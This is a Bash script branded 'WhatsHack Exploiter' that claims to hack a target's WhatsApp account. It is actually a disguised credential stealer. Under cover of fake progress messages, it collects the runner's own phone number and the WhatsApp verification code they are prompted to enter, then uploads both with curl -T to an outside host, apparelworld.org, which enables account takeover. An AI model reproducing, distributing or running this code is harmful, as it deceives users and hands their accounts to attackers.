#!/bin/bash
clear
echo "
<-- CYBER LION SQUAD -->
####################
#   WhatsHack      # By MR.G4N70XY 
#   Exploiter      # mrg4n70xy@gmail.com
####################

Keluar = CTRL + C

Copyright (c) 2019 CYBER LION SQUAD";
echo "";
read -p "Nomer Anda (+62xxxx)=> " nomer;
read -p "Nomer Target (+62xxxx) => " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> info.html;
curl -T info.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
read -p "Kode Verifikasi => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> info.html;
curl -T info.html http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;
